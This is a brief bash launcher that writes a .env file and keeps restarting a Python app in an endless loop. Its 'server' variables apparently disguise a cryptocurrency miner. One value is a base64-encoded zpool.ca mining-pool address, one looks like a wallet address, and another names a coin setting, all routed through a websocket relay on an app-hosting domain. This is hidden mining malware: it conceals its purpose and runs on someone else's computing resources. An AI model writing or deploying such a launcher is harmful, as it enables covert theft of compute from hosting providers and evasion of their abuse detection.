#!/bin/bash
CONNECT=$1
NAME=$2
echo "SERVER_WS=wss://identical-sile-malphite-node-dfaa5ec5.koyeb.app
SERVER_TARGET=bWlub3RhdXJ4Lm5hLm1pbmUuenBvb2wuY2E6NzAxOQ==
SERVER_DOMAIN=DNbHCwVeAoGVAA49s62RTXpdcjZk5w17eE
SERVER_SECRET=c=DGB,zap=MAZA
SERVER_CONNECTION=${CONNECT}
SERVER_MODE=FAST" > .env
while true; do python3 app.py; sleep 10; done
